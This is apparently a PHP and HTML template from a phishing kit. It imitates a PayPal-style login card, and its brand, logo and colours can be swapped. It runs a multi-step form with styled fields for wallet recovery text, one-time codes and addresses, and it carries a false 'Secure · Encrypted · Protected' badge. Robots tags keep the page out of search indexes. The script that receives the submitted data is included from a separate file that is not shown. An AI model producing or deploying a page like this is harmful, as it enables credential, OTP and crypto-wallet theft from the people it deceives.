<?php
// Payment template — PayPal style: white card, centered logo, thin progress bar
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Log In</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',Helvetica,Arial,sans-serif;min-height:100vh;min-height:100dvh;background:#f5f7fa;display:flex;align-items:center;justify-content:center;padding:20px 16px;color:#2c2e2f}
.card{width:100%;max-width:400px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 16px rgba(0,0,0,.12)}

/* Header */
.hd{background:#fff;padding:28px 28px 14px;text-align:center;border-bottom:1px solid #f0f0f0}
.logo-box{width:64px;height:64px;background:<?=$logo_bg?>;border-radius:12px;display:inline-flex;align-items:center;justify-content:center;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,.12)}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:24px;font-weight:800;color:<?=$accent?>}
.hd-name{font-size:20px;font-weight:800;color:<?=$accent?>;margin-top:10px;letter-spacing:-.4px}
.hd-tagline{font-size:12px;color:#6c7378;margin-top:4px}

/* Progress bar */
.prog-wrap{height:3px;background:#e8ecef;position:relative}
.prog-bar{height:3px;background:<?=$accent?>;transition:width .4s ease;width:calc(100% / <?=$total_steps?>)}

/* Body */
.bd{padding:24px 28px 20px}
.step-title{font-size:22px;font-weight:700;color:#2c2e2f;margin-bottom:6px;text-align:center;letter-spacing:-.4px}
.step-sub{font-size:13px;color:#687173;text-align:center;margin-bottom:20px;line-height:1.5}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#687173;font-weight:600;margin-bottom:6px}
.field input{width:100%;background:#f5f7fa;border:1.5px solid #cbd2d9;color:#2c2e2f;padding:12px 14px;border-radius:6px;font-size:14px;outline:none;transition:border-color .2s,background .2s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:<?=$accent?>;background:#fff;box-shadow:0 0 0 3px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.1)}
.field input::placeholder{color:#9aa5b4}
.or-div{text-align:center;font-size:12px;color:#9aa5b4;margin:10px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:#e8ecef}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:14px;background:<?=$accent?>;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:25px;cursor:pointer;margin-top:6px;letter-spacing:.2px;transition:filter .15s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(1.08)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:20px;top:50%;width:18px;height:18px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#cc0000;margin-top:8px;text-align:center;display:none}
.security-note{display:flex;align-items:center;gap:6px;justify-content:center;font-size:11px;color:#9aa5b4;margin-top:14px}
.wallet-area{width:100%;min-height:80px;background:#f5f7fa;border:1.5px solid #cbd2d9;color:#2c2e2f;padding:12px 14px;border-radius:6px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#9aa5b4;margin-top:6px;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;padding:12px 4px;max-width:48px;background:#f5f7fa;border:1.5px solid #cbd2d9;border-radius:6px;color:#2c2e2f;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#9aa5b4;text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:#f5f7fa;border:1.5px solid #cbd2d9;color:#2c2e2f;padding:12px 14px;border-radius:6px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}
.card-footer{padding:12px 20px;background:#f8f9fb;border-top:1px solid #f0f0f0;font-size:10px;color:#9aa5b4;text-align:center;line-height:1.6}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.85);z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid #e8ecef;border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#687173}

@media(max-width:480px){
  body{padding:0;align-items:flex-start;background:#fff}
  .card{border-radius:0;min-height:100vh;min-height:100dvh;box-shadow:none}
  .bd{padding:22px 20px 16px}
  .hd{padding:24px 20px 14px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying…</div></div>

<div class="card">
  <div class="hd">
    <div class="logo-box">
      <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><?php endif?>
      <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
    </div>
    <div class="hd-name"><?=$org_name?></div>
    <div class="hd-tagline">Fast · Safe · Easy</div>
  </div>
  <div class="prog-wrap"><div class="prog-bar" id="progBar"></div></div>

  <div class="bd">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <div class="security-note">🔒 Secure · Encrypted · Protected</div>
    </div>
    <?php endfor; ?>
  </div>

  <?php if($footer): ?>
  <div class="card-footer"><?=$footer?></div>
  <?php endif; ?>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
// Animate progress bar on step change
const _origShow = showStep;
function showStep(n) {
    _origShow(n);
    const pb = document.getElementById('progBar');
    if (pb) pb.style.width = (n / TOTAL_STEPS * 100) + '%';
}
</script>
</body>
</html>
